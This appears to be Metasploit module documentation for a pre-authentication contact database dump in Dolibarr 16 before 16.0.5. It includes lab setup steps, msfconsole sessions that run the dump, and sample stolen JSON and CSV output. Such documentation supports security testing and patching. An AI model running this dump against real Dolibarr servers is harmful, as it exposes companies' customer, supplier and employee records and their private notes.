## Vulnerable Application
### Dolibarr 16 pre-auth contact database dump

Dolibarr version 16 < 16.0.5 is vulnerable to a pre-authentication contact database dump.
An unauthenticated attacker may retrieve a company’s entire customer file, prospects, suppliers,
and potentially employee information if a contact file exists.
Both public and private notes are also included in the dump.

### Dolibarr GitHub Repository & Dolibarr setup with vulnerable docker image

If you need to setup Dolibarr,
this is the official GitHub Repository from Dolibarr or via docker with an unofficial but working image and docker-compose.
``` 
Official GitHub Repository:

https://github.com/Dolibarr/dolibarr/tree/16.0.4
```


Unofficial image with docker-compose:

`docker pull tuxgasy/dolibarr:16.0.4`

Important: This image does not contain a database. So you need to link it with a database container.

Use Docker Compose to integrate it with MariaDB (you can also use MySQL if you prefer).

Create docker-compose.yml file as following:
```
version: "3"

services:
    mariadb:
        image: mariadb:latest
        environment:
            MARIADB_DATABASE: dolibarr
            MARIADB_USER: dolibarr 
            MARIADB_PASSWORD: dolibarr
            MARIADB_RANDOM_ROOT_PASSWORD: 'yes'
    web:
        image: tuxgasy/dolibarr:16.0.4
        environment:
            DOLI_DB_HOST: mariadb
            DOLI_DB_USER: dolibarr
            DOLI_DB_PASSWORD: dolibarr
            DOLI_DB_NAME: dolibarr
            DOLI_URL_ROOT: 'http://0.0.0.0'
            PHP_INI_DATE_TIMEZONE: 'Europe/Paris'
        ports:
            - "80:80"
```

Then run all services with `docker-compose up -d`. Now, go to http://0.0.0.0 to access to the new Dolibarr installation.

## Dolibarr Configuration

Default credentials : admin/admin

Important:
Once Dolibarr is installed,
you will have to activate the Third-parties module and create at least one contact in the latter to validate that the module works.

To use this module, you must first enable it using an administrator account, via the menu option "Home - Setup - Modules/Applications".

Choose the tab where the module is listed. Then click on "Activate".

Finally, you can create a member via "Third-parties - New Contact/Address".

## Verification Steps

1. Install the application
2. Start msfconsole
3. Do: `use auxiliary/scanner/http/dolibarr_16_contact_dump`
4. Do: `set RHOSTS [IP] or [Dolibarr domain]`
5. Do: `exploit`
6. You should retrieve a file.

## Options

### TARGETURI

The path to Dolibarr instance.  Defaults to `/`,  `http://dolibarrdomain/`

## Scenarios

### Dolibarr 16.0.4 on Ubuntu 22.10
Exploitation of a Dolibarr 16.0.4.
```
msf6 > use auxiliary/scanner/http/dolibarr_16_contact_dump
msf6 auxiliary(scanner/http/dolibarr_16_contact_dump) > set RHOSTS http://[Dolibarr domain]/
RHOSTS => http://[Dolibarr domain]/
msf6 auxiliary(scanner/http/dolibarr_16_contact_dump) > exploit

[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Detected vulnerable Dolibarr version: 16.0.4                                        
[+] Database type: mysqli                                                                
[+] Database name: dolibarr                                                              
[+] Database user: dolibarr                                                              
[+] Database host: mariadb                                                               
[+] Database port: 3306                                                                  
[+] Found 1 contacts.                                                                    
[+] 0.0.0.0:80 - File saved in: /home/kali/.msf4/loot/20230424042820_default_0.0.0.0_dolibarr_820189.json                                                                         
[+] 0.0.0.0:80 - File saved in: /home/kali/.msf4/loot/20230424042820_default_0.0.0.0_dolibarr_736790.csv                                                                          
[*] Scanned 1 of 1 hosts (100% complete)                                                 
[*] Auxiliary module execution completed
```
### Dolibarr 16.0.4 on Ubuntu 22.10
Attempted exploitation of a Dolibarr 16.0.4 with an empty database.
```
msf6 > use auxiliary/scanner/http/dolibarr_16_contact_dump 
msf6 auxiliary(scanner/http/dolibarr_16_contact_dump) > set RHOSTS X.X.X.X
RHOSTS => X.X.X.X
msf6 auxiliary(scanner/http/dolibarr_16_contact_dump) > exploit

[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Detected vulnerable Dolibarr version: 16.0.4
[-] unexpected-reply: Dolibarr data did not include contacts field
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
### Dolibarr 17.0.0 on Ubuntu 22.10
Attempted exploitation of a Dolibarr 17.0.0.
```
msf6 > use auxiliary/scanner/http/dolibarr_16_contact_dump 
msf6 auxiliary(scanner/http/dolibarr_16_contact_dump) > set RHOSTS X.X.X.X
RHOSTS => X.X.X.X
msf6 auxiliary(scanner/http/dolibarr_16_contact_dump) > set verbose true
verbose => true
msf6 auxiliary(scanner/http/dolibarr_16_contact_dump) > exploit

[*] Running automatic check ("set AutoCheck false" to disable)
[!] The target is not exploitable. Detected apparently non-vulnerable Dolibarr version: 17.0.0 ForceExploit is enabled, proceeding with exploitation.
[-] unexpected-reply: Exploit response code: 403
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## Contact database dump
Here is an example of what your .csv and .json files would look like if the contact exfiltration was successful.

### .json

```
{
  "contacts": [
    {
      "db": {
        "db": {
        },
        "type": "mysqli",
        "forcecharset": "utf8",
        "forcecollate": "utf8_unicode_ci",
        "connected": true,
        "database_selected": true,
        "database_name": "dolibarr",
        "database_user": "dolibarr",
        "database_host": "mariadb",

        ...

        },
        "civility_code": "MR",
        "civility": "Mr.",
        "civilite": null,
        "address": "5100, rue de la Boatie",
        "zip": "69000",
        "town": "Lyon",
        "poste": "DSI",

        ...
```

### .csv

| id | country_code | state | note_private | lastname | firstname | civility | address | zip | town | poste | email |
|---|---|---|---|---|---|---|---|---|---|---|---|
|  1  | FR | Rhône |   | Latourelle | Valentine | Mrs. | 1700, Place de Paume | 69400 | Bron | CEO |  valentine@latourelle.latourelle |
|  2  | FR |   | don't make any discount |  Paston | Hugues | Mr. | 2200, rue Bonneteria | 59370 |  Mairieux | CEO | hugues@paston.paston |
|  3  | FR | Rhône  |   | Grivois | Thierry | Mr. | 5100, rue de la Boatie | 69000 | Lyon | DSI | thierry@grivois.grivois |
